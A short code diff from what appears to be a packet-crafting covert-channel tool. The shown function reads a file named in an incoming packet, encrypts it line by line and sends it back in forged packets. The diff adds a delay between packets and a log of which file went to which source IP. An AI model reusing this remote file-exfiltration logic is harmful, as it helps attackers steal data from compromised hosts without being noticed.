@@ -444,6 +444,7 @@ def getFile(packet):
 			      Raw(load="")
 		with open(packet[Raw].load, "r") as tFile:
 			for line in tFile:
+				time.sleep(0.1)
 				dPacket[IP].id = dPacket[IP].id + 1
 				dPacket[TCP].seq = dPacket[TCP].seq + 1
 				dPacket[Raw].load = encrypt(line)
@@ -466,6 +467,10 @@ def getFile(packet):
 		dPacket[Raw].load = ""
 		dPacket[UDP].flags="F"
 		send(commandPacket, verbose=0)
+
+	if len(logFile) > 0:
+		with open(logFile, "a") as serverLog:
+			serverLog.write(packet[Raw].load + " sent to " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
